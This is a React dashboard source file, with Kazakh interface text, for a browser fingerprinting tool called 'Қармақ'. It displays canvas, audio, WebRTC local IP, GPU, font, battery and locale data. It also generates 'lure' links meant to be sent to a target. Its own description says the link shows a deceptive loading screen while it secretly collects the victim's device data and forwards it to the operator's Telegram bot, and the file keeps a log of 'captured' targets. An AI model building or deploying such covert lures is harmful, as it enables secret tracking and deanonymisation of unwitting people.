// ==========================================
// © Қармақ — Group A Device Fingerprinting
// index.tsx (Main Profiler Dashboard)
// ==========================================

import { useState } from 'react'
import {
  FiCheck,
  FiCopy,
  FiCpu,
  FiDownload,
  FiMonitor,
  FiRefreshCw,
  FiSend,
  FiShield,
  FiTerminal,
  FiType,
  FiWifi,
} from 'react-icons/fi'
import { toast } from 'sonner'
import {
  AuthGate,
  Button,
  DataRow,
  Pill,
  SpecimenCard,
  SpecimenCardSection,
  Strip,
  StripItem,
} from '@/components'
import { useFingerprint } from '@/core/fingerprint'
import { sendTelegramAlert } from '@/core/notify/telegram'
import styles from './landing.module.scss'

export function Component(): React.ReactElement {
  const { data, loading, progress, step, error, refresh } = useFingerprint()
  const [showJson, setShowJson] = useState(false)
  const [copiedHash, setCopiedHash] = useState(false)
  const [copiedLure, setCopiedLure] = useState(false)
  const [capturedLogs, setCapturedLogs] = useState<any[]>([])

  const [lurePath, setLurePath] = useState('/preview')
  const host =
    typeof window !== 'undefined' && !window.location.origin.includes('localhost')
      ? window.location.origin
      : 'https://sitequr.vercel.app'
  const lureUrl = `${host}${lurePath}`

  const loadCapturedLogs = () => {
    try {
      const raw = localStorage.getItem('qarmaq_captured_logs')
      setCapturedLogs(raw ? JSON.parse(raw) : [])
    } catch {}
  }

  // Load logs on mount
  useState(() => {
    loadCapturedLogs()
  })

  const handleCopyLureUrl = async () => {
    try {
      await navigator.clipboard.writeText(lureUrl)
      setCopiedLure(true)
      toast.success('🎯 Қармақ сілтемесі көшірілді!')
      setTimeout(() => setCopiedLure(false), 2000)
    } catch {
      toast.error('Көшіру сәтсіз аяқталды')
    }
  }

  const handleClearLogs = () => {
    localStorage.removeItem('qarmaq_captured_logs')
    setCapturedLogs([])
    toast.info('Тұзақ журналы тазартылды')
  }

  // Copy composite hash
  const handleCopyHash = async () => {
    if (!data?.compositeHash) return
    try {
      await navigator.clipboard.writeText(data.compositeHash)
      setCopiedHash(true)
      toast.success('Саусақ ізінің хэші көшірілді!')
      setTimeout(() => setCopiedHash(false), 2000)
    } catch {
      toast.error('Көшіру сәтсіз аяқталды')
    }
  }

  // Copy complete JSON report
  const handleCopyJson = async () => {
    if (!data) return
    try {
      await navigator.clipboard.writeText(JSON.stringify(data, null, 2))
      toast.success('Барлық JSON деректері көшірілді!')
    } catch {
      toast.error('Көшіру сәтсіз аяқталды')
    }
  }

  // Export JSON file
  const handleDownloadJson = () => {
    if (!data) return
    const blob = new Blob([JSON.stringify(data, null, 2)], {
      type: 'application/json',
    })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `qarmaq-fingerprint-${data.compositeHash}.json`
    a.click()
    URL.revokeObjectURL(url)
    toast.success('JSON есебі жүктелді')
  }

  if (loading && !data) {
    return (
      <div className={styles.page}>
        <div className={styles.loadingContainer}>
          <div className={styles.loadingSpinner} />
          <div className={styles.progressBar}>
            <div
              className={styles.progressFill}
              style={{ width: `${progress}%` }}
            />
          </div>
          <div className={styles.loadingStep}>{step}</div>
          <Pill tone="paper">Group A Client-Side Scanner</Pill>
        </div>
      </div>
    )
  }

  if (error || !data) {
    return (
      <div className={styles.page}>
        <div className={styles.loadingContainer}>
          <h2 style={{ color: '#c4341c' }}>Сканерлеу кезінде қате орын алды</h2>
          <p>{error}</p>
          <Button onClick={refresh} variant="alarm">
            Қайта байқап көру
          </Button>
        </div>
      </div>
    )
  }

  const {
    compositeHash,
    scanDurationMs,
    timestamp,
    canvas,
    audio,
    webrtc,
    fonts,
    webgl,
    hardware,
    screen,
    locale,
    battery,
    network,
    storage,
    capabilities,
  } = data

  return (
    <AuthGate>
    <div className={styles.page}>
      {/* Top Telemetry Strip */}
      <Strip>
        <StripItem label="АРНА (CHANNEL)">GROUP_A_CLIENT</StripItem>
        <StripItem label="ҚАУІПСІЗДІК">ZERO_SERVER_RELIANCE</StripItem>
        <StripItem label="ҰЗАҚТЫҒЫ">{scanDurationMs}ms</StripItem>
        <StripItem label="ПЛАТФОРМА">{hardware.platform}</StripItem>
        <StripItem label="КҮЙІ" inverted>
          АКТИВТІ
        </StripItem>
      </Strip>

      {/* Main Header */}
      <header className={styles.header}>
        <div className={styles.headerTop}>
          <div className={styles.titleGroup}>
            <span className={styles.badge}>
              <FiShield /> Нақты уақыттағы құрылғы профайлері
            </span>
            <h1 className={styles.headline}>ҚАРМАҚ // FINGERPRINT PROFILER</h1>
            <p className={styles.subtitle}>
              Браузер мен құрылғының цифрлық саусақ ізін (Group A деректерін)
              ешқандай серверлік тәуелділіксіз, таза React арқылы тегін сканерлеу.
            </p>
          </div>

          <div className={styles.actionsGroup}>
            <Button onClick={refresh} variant="ghost" size="sm">
              <FiRefreshCw style={{ marginRight: 6 }} /> Қайта сканерлеу
            </Button>
            <Button
              onClick={async () => {
                if (data) {
                  toast.loading('Telegram-ға хабарлама жіберілуде…', { id: 'tg' })
                  const ok = await sendTelegramAlert(data)
                  if (ok) {
                    toast.success('✅ Telegram-ға сынақ хабарламасы сәтті жеткізілді!', { id: 'tg' })
                  } else {
                    toast.error('❌ Telegram-ға жіберу сәтсіз аяқталды', { id: 'tg' })
                  }
                }
              }}
              variant="ghost"
              size="sm"
            >
              <FiSend style={{ marginRight: 6 }} /> Telegram тест
            </Button>
            <Button onClick={handleCopyJson} variant="primary" size="sm">
              <FiCopy style={{ marginRight: 6 }} /> Барлық JSON-ды көшіру
            </Button>
            <Button onClick={handleDownloadJson} variant="ghost" size="sm">
              <FiDownload style={{ marginRight: 6 }} /> Жүктеп алу
            </Button>
          </div>
        </div>
      </header>

      {/* Canary Lure Generator Box */}
      <div className={styles.lureBanner}>
        <span className={styles.lureTag}>🎯 ҚАРМАҚ СІЛТЕМЕСІ (CANARY LURE LINK)</span>
        <h3 className={styles.lureTitle}>Нысанаға немесе күдікті адамға жіберетін қармақ сілтемесі</h3>
        <p className={styles.lureDesc}>
          Төмендегі сілтемені көшіріп, нысанаға жіберіңіз. Ол сілтемені ашқан сәтте
          «SiteQur — Жоба жүктелуде…» деген алдамшы экранды көреді, ал оның барлық Group A
          деректері (Local IP, GPU, қаріптер, экран, батарея) жасырын сканерленіп,
          тікелей Telegram ботыңызға жіберіледі!
        </p>

        <div style={{ display: 'flex', gap: '8px', marginBottom: '12px', flexWrap: 'wrap' }}>
          {[
            { path: '/preview', label: '🌐 /preview (Сайт үлгісі)' },
            { path: '/doc', label: '📄 /doc (Құжат)' },
            { path: '/project', label: '💼 /project (Жоба)' },
            { path: '/view', label: '👁️ /view (Қарау)' },
          ].map((item) => (
            <button
              key={item.path}
              type="button"
              onClick={() => setLurePath(item.path)}
              style={{
                padding: '4px 10px',
                fontSize: '12px',
                borderRadius: '6px',
                cursor: 'pointer',
                background: lurePath === item.path ? '#0df2c9' : 'rgba(255,255,255,0.06)',
                color: lurePath === item.path ? '#050709' : '#a1a7b4',
                border: lurePath === item.path ? '1px solid #0df2c9' : '1px solid rgba(255,255,255,0.1)',
                fontWeight: lurePath === item.path ? 600 : 400,
                transition: 'all 0.15s ease',
              }}
            >
              {item.label}
            </button>
          ))}
        </div>
        <div className={styles.lureLinkBar}>
          <code className={styles.lureUrl}>{lureUrl}</code>
          <Button onClick={handleCopyLureUrl} size="sm" variant="alarm">
            {copiedLure ? (
              <>
                <FiCheck style={{ marginRight: 6 }} /> Көшірілді
              </>
            ) : (
              <>
                <FiCopy style={{ marginRight: 6 }} /> Қармақ сілтемесін көшіру
              </>
            )}
          </Button>
          <a href={lureUrl} target="_blank" rel="noreferrer">
            <Button size="sm" variant="ghost">
              Сілтемені тексеру ↗
            </Button>
          </a>
        </div>
      </div>

      {/* Composite Unique Hash Box */}
      <div className={styles.hashBox}>
        <div className={styles.hashMeta}>
          <span className={styles.hashLabel}>
            Құрылғының бірегей цифрлық хэші (Composite Fingerprint ID)
          </span>
          <span className={styles.hashValue}>{compositeHash}</span>
        </div>
        <div className={styles.hashButtons}>
          <Button onClick={handleCopyHash} size="sm">
            {copiedHash ? (
              <>
                <FiCheck style={{ marginRight: 6 }} /> Көшірілді
              </>
            ) : (
              <>
                <FiCopy style={{ marginRight: 6 }} /> Хэшті көшіру
              </>
            )}
          </Button>
          <Pill tone="signal">100% Client Computed</Pill>
        </div>
      </div>

      {/* Quick Summary Cards */}
      <div className={styles.summaryGrid}>
        <div className={styles.metricCard}>
          <div className={styles.metricIconTitle}>
            <FiMonitor /> Видеокарта (GPU)
          </div>
          <div className={styles.metricMain}>
            {webgl?.renderer ? webgl.renderer.split('(')[0] : 'Табылмады'}
          </div>
          <div className={styles.metricSub}>
            Vendor: {webgl?.vendor || 'Standard WebGL'}
          </div>
        </div>

        <div className={styles.metricCard}>
          <div className={styles.metricIconTitle}>
            <FiWifi /> Жергілікті IP (WebRTC)
          </div>
          <div className={styles.metricMain}>
            {webrtc.localIPs.length > 0 ? webrtc.localIPs[0] : 'Бүркемеленген (mDNS)'}
          </div>
          <div className={styles.metricSub}>
            STUN кандидаттары: {webrtc.candidateTypes.join(', ') || 'Жоқ'}
          </div>
        </div>

        <div className={styles.metricCard}>
          <div className={styles.metricIconTitle}>
            <FiCpu /> Процессор және Жад
          </div>
          <div className={styles.metricMain}>
            {hardware.cores ? `${hardware.cores} Cores` : 'Белгісіз'}
            {hardware.memoryGb ? ` · ${hardware.memoryGb} GB RAM` : ''}
          </div>
          <div className={styles.metricSub}>
            Платформа: {hardware.platform}
          </div>
        </div>

        <div className={styles.metricCard}>
          <div className={styles.metricIconTitle}>
            <FiType /> Орнатылған қаріптер
          </div>
          <div className={styles.metricMain}>
            {fonts.detectedCount} / {fonts.testedCount} анықталды
          </div>
          <div className={styles.metricSub}>
            Signature: {fonts.hash.slice(0, 12)}…
          </div>
        </div>
      </div>

      {/* Detailed Diagnostic Cards Grid */}
      <div className={styles.contentGrid}>
        {/* 1. Canvas Fingerprint */}
        <SpecimenCard
          tag="SPECIMEN № 01"
          serial="CANVAS_2D_RENDER_PROBE"
          tone="paper"
        >
          <SpecimenCardSection label="01 // Canvas саусақ ізі">
            <p style={{ fontSize: '0.85rem', color: '#46402f' }}>
              Әр графикалық драйвер мен операциялық жүйенің қаріпті антиалиасингтеу
              және градиент салу математикасы өзгеше пиксельдер түзеді:
            </p>

            {canvas.dataUrl && (
              <div className={styles.canvasPreviewContainer}>
                <div className={styles.canvasBox}>
                  <img src={canvas.dataUrl} alt="Canvas Fingerprint Preview" />
                </div>
              </div>
            )}

            <DataRow label="FNV-1a 32-bit Hash" mono emphasize>
              {canvas.hash}
            </DataRow>
            <DataRow label="SHA-256 Digest" mono>
              {canvas.sha256.slice(0, 24)}…
            </DataRow>
            <DataRow label="Өлшемі">
              {canvas.width} × {canvas.height} px
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 2. AudioContext Fingerprint */}
        <SpecimenCard
          tag="SPECIMEN № 02"
          serial="AUDIO_SPECTRUM_PROBE"
          tone="paper"
        >
          <SpecimenCardSection label="02 // AudioContext акустикалық спектрі">
            <p style={{ fontSize: '0.85rem', color: '#46402f' }}>
              OfflineAudioContext компрессоры мен осцилляторының тербелісі
              аппараттық математикалық ерекшеліктерді тіркейді:
            </p>

            {audio.samples.length > 0 && (
              <div className={styles.audioWaveform}>
                {audio.samples.map((val, idx) => {
                  const maxVal = Math.max(...audio.samples, 0.001)
                  const heightPct = Math.max(8, Math.min(100, (val / maxVal) * 100))
                  return (
                    <div
                      key={`sample-${idx}`}
                      className={styles.waveformBar}
                      style={{ height: `${heightPct}%` }}
                      title={`Sample ${idx}: ${val}`}
                    />
                  )
                })}
              </div>
            )}

            <DataRow label="Спектрлік қосынды (Spectral Sum)" mono emphasize>
              {audio.spectralSum}
            </DataRow>
            <DataRow label="Аудио хэш" mono>
              {audio.hash.slice(0, 24)}…
            </DataRow>
            <DataRow label="Есептелу уақыты">{audio.durationMs} ms</DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 3. WebRTC Local IP Leak */}
        <SpecimenCard
          tag="SPECIMEN № 03"
          serial="WEBRTC_STUN_HARVEST"
          tone="paper"
        >
          <SpecimenCardSection label="03 // WebRTC желілік сокеттері">
            <p style={{ fontSize: '0.85rem', color: '#46402f' }}>
              Браузер RTCPeerConnection арқылы STUN серверіне сұрау салғанда
              жергілікті желілік интерфейстерінің деректері алынады:
            </p>

            <DataRow label="WebRTC қолдауы">
              {webrtc.supported ? (
                <Pill tone="signal">ҚОЛДАЙДЫ</Pill>
              ) : (
                <Pill tone="alarm">БҰҒАТТАЛҒАН</Pill>
              )}
            </DataRow>

            <DataRow label="Табылған Local IP" mono emphasize>
              {webrtc.localIPs.length > 0
                ? webrtc.localIPs.join(', ')
                : 'Жоқ немесе mDNS-пен қорғалған'}
            </DataRow>

            <DataRow label="Кандидат түрлері" mono>
              {webrtc.candidateTypes.join(', ') || 'анықталмады'}
            </DataRow>

            <DataRow label="STUN сервері" mono>
              stun:stun.l.google.com:19302
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 4. Detected Fonts */}
        <SpecimenCard
          tag="SPECIMEN № 04"
          serial="FONT_PROBE_CLUSTER"
          tone="paper"
        >
          <SpecimenCardSection label="04 // Орнатылған қаріптер (System Fonts)">
            <p style={{ fontSize: '0.85rem', color: '#46402f' }}>
              Жасырын span арқылы жүйеде орнатылған қаріптердің ені салыстырылып,
              бірегей қаріптер профилі анықталды:
            </p>

            <div className={styles.fontTags}>
              {fonts.detected.map((font) => (
                <Pill key={font} tone="ink" size="sm">
                  {font}
                </Pill>
              ))}
            </div>

            <DataRow label="Анықталған қаріптер саны" emphasize>
              {fonts.detectedCount} қаріп (барлығы {fonts.testedCount} тексерілді)
            </DataRow>
            <DataRow label="Қаріптер қолтаңбасы" mono>
              {fonts.hash.slice(0, 24)}…
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 5. WebGL Deep Diagnostics */}
        <SpecimenCard
          tag="SPECIMEN № 05"
          serial="WEBGL_SHADING_MATRIX"
          tone="paper"
        >
          <SpecimenCardSection label="05 // WebGL және GPU мүмкіндіктері">
            <DataRow label="Видеокарта моделі" mono emphasize>
              {webgl?.renderer || 'Табылмады'}
            </DataRow>
            <DataRow label="GPU өндірушісі" mono>
              {webgl?.vendor || 'Unknown'}
            </DataRow>
            <DataRow label="WebGL 2 қолдауы">
              {webgl?.webgl2 ? (
                <Pill tone="signal">WEBGL 2.0</Pill>
              ) : (
                <Pill tone="paper">WEBGL 1.0</Pill>
              )}
            </DataRow>
            <DataRow label="Max Texture Size" mono>
              {webgl?.maxTextureSize.toLocaleString()} px
            </DataRow>
            <DataRow label="Max Viewport" mono>
              {webgl?.maxViewportDims.join(' × ')} px
            </DataRow>
            <DataRow label="Антиалиасинг (Antialias)">
              {webgl?.antialiasing ? 'Иә (Enabled)' : 'Жоқ'}
            </DataRow>
            <DataRow label="Шейдер нұсқасы" mono>
              {webgl?.shadingLangVer || 'N/A'}
            </DataRow>
            <DataRow label="Қолдаулы кеңейтімдер саны">
              {webgl?.extensionsCount} кеңейтім
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 6. Hardware, Display & Power */}
        <SpecimenCard
          tag="SPECIMEN № 06"
          serial="HARDWARE_POWER_TELEMETRY"
          tone="paper"
        >
          <SpecimenCardSection label="06 // Аппаратура, Экран және Батарея">
            <DataRow label="Экран рұқсаты" mono emphasize>
              {screen.width} × {screen.height} px
            </DataRow>
            <DataRow label="Қолжетімді экран (Avail)" mono>
              {screen.availWidth} × {screen.availHeight} px
            </DataRow>
            <DataRow label="Device Pixel Ratio (DPR)">
              {screen.dpr}x
            </DataRow>
            <DataRow label="Түс тереңдігі (Color Depth)">
              {screen.colorDepth}-bit
            </DataRow>
            <DataRow label="Браузер терезесі (Viewport)" mono>
              {screen.viewportWidth} × {screen.viewportHeight} px
            </DataRow>
            <DataRow label="CPU ядролары (Concurrency)">
              {hardware.cores ? `${hardware.cores} ядро` : 'Анықталмады'}
            </DataRow>
            <DataRow label="Жедел жад (RAM)">
              {hardware.memoryGb ? `≥ ${hardware.memoryGb} GB` : 'Бұркемеленген'}
            </DataRow>
            <DataRow label="Батарея деңгейі">
              {battery.supported && battery.level !== null ? (
                <Pill tone={battery.charging ? 'signal' : 'paper'}>
                  {battery.level}% {battery.charging ? '(Қуатталуда ⚡)' : ''}
                </Pill>
              ) : (
                <Pill tone="paper">Қолдау жоқ / шектелген</Pill>
              )}
            </DataRow>
            <DataRow label="Сенсорлық нүктелер (Touch Points)">
              {hardware.touchPoints > 0
                ? `${hardware.touchPoints} сенсорлық нүкте`
                : 'Сенсор жоқ (Тінтуір/Mouse)'}
            </DataRow>
            <DataRow label="Желілік қосылым (Network)">
              {network.supported && network.effectiveType
                ? `${network.effectiveType.toUpperCase()}${network.downlink ? ` · ${network.downlink} Mbps` : ''}${network.rtt ? ` · ${network.rtt}ms RTT` : ''}`
                : 'Шектелген немесе стандартты'}
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 7. Locale, Storage & Capabilities */}
        <SpecimenCard
          tag="SPECIMEN № 07"
          serial="ENV_STORAGE_CAPABILITIES"
          tone="paper"
        >
          <SpecimenCardSection label="07 // Тіл, Уақыт белдеуі және Құпиялылық">
            <DataRow label="Уақыт белдеуі (Timezone)" mono emphasize>
              {locale.timezone}
            </DataRow>
            <DataRow label="UTC ығысуы (Offset)">
              {locale.timezoneOffset} минут ({locale.timezoneOffset / -60} сағат)
            </DataRow>
            <DataRow label="Негізгі тіл">{locale.language}</DataRow>
            <DataRow label="Барлық тілдер" mono>
              {locale.languages.join(', ')}
            </DataRow>
            <DataRow label="Күнтізбе (Calendar)">
              {locale.calendar || 'gregory'}
            </DataRow>
            <DataRow label="Дерек қоймасы (Storage)">
              {storage.localStorage ? 'LocalStorage ✓ ' : ''}
              {storage.indexedDB ? 'IndexedDB ✓ ' : ''}
              {storage.cookies ? 'Cookies ✓' : ''}
            </DataRow>
            <DataRow label="WebAssembly қолдауы">
              {capabilities.webAssembly ? (
                <Pill tone="signal">ҚОЛДАЙДЫ</Pill>
              ) : (
                <Pill tone="alarm">ЖОҚ</Pill>
              )}
            </DataRow>
            <DataRow label="Do Not Track (DNT)">
              {hardware.doNotTrack ? 'Қосулы (1)' : 'Өшірулі (0)'}
            </DataRow>
          </SpecimenCardSection>
        </SpecimenCard>

        {/* 8. Raw JSON Inspector Card */}
        <SpecimenCard
          tag="RAW EXPORT"
          serial="PAYLOAD_TRANSMISSION_SCHEMA"
          tone="ink"
        >
          <SpecimenCardSection label="08 // Толық JSON құрылымы">
            <p style={{ fontSize: '0.85rem', color: '#b8ad95' }}>
              Бұл JSON объектісін бэкэндке, Telegram ботқа немесе талдау жүйелеріне
              жөнелтуге дайын:
            </p>
            <div style={{ marginTop: '0.75rem', marginBottom: '0.75rem' }}>
              <Button
                onClick={() => setShowJson(!showJson)}
                variant="ghost"
                size="sm"
              >
                <FiTerminal style={{ marginRight: 6 }} />
                {showJson ? 'JSON-ды жасыру' : 'Толық JSON-ды ашу'}
              </Button>
            </div>

            {showJson && (
              <pre className={styles.jsonBox}>
                {JSON.stringify(data, null, 2)}
              </pre>
            )}
          </SpecimenCardSection>
        </SpecimenCard>
      </div>

      {/* Captured Targets Activity Log Section */}
      <section className={styles.capturedSection}>
        <div className={styles.capturedHeader}>
          <h2 className={styles.capturedTitle}>
            🎯 Тұзаққа түскендер журналы (Activity Log)
            {capturedLogs.length > 0 && (
              <Pill tone="alarm">{capturedLogs.length} қақпан іске қосылды</Pill>
            )}
          </h2>
          <div style={{ display: 'flex', gap: '0.5rem' }}>
            <Button onClick={loadCapturedLogs} size="sm" variant="ghost">
              Журналды жаңарту
            </Button>
            {capturedLogs.length > 0 && (
              <Button onClick={handleClearLogs} size="sm" variant="alarm">
                Тазарту
              </Button>
            )}
          </div>
        </div>

        {capturedLogs.length === 0 ? (
          <div className={styles.capturedEmpty}>
            Әзірге қармақ сілтемесін ешкім ашқан жоқ. Сілтемені нысанаға жіберіңіз!
          </div>
        ) : (
          <div className={styles.capturedGrid}>
            {capturedLogs.map((log) => (
              <div key={log.id} className={styles.capturedCard}>
                <div className={styles.capturedTop}>
                  <strong style={{ color: '#c4341c', fontFamily: 'monospace' }}>
                    {log.compositeHash}
                  </strong>
                  <span className={styles.capturedTime}>
                    {new Date(log.capturedAt).toLocaleString()}
                  </span>
                </div>
                <div className={styles.capturedDetails}>
                  <div className={styles.detailItem}>
                    <span className={styles.detailKey}>Local IP:</span>
                    <span className={styles.detailVal}>{log.localIP}</span>
                  </div>
                  <div className={styles.detailItem}>
                    <span className={styles.detailKey}>GPU:</span>
                    <span className={styles.detailVal}>{log.gpu}</span>
                  </div>
                  <div className={styles.detailItem}>
                    <span className={styles.detailKey}>Экран:</span>
                    <span className={styles.detailVal}>{log.screen}</span>
                  </div>
                  <div className={styles.detailItem}>
                    <span className={styles.detailKey}>Платформа / Тіл:</span>
                    <span className={styles.detailVal}>
                      {log.platform} · {log.timezone}
                    </span>
                  </div>
                  <div className={styles.detailItem}>
                    <span className={styles.detailKey}>Батарея:</span>
                    <span className={styles.detailVal}>{log.battery}</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </section>

      {/* Footer */}
      <footer className={styles.footer}>
        <div>ҚАРМАҚ // Group A Digital Fingerprint Scanner</div>
        <div>Уақыты: {timestamp}</div>
        <div>
          <a
            href="https://github.com/Azamaperdeev05/canary-token-generator"
            target="_blank"
            rel="noreferrer"
            style={{ color: 'inherit', textDecoration: 'underline' }}
          >
            GitHub Repository
          </a>
        </div>
      </footer>
    </div>
    </AuthGate>
  )
}

Component.displayName = 'GroupAFingerprintDashboard'
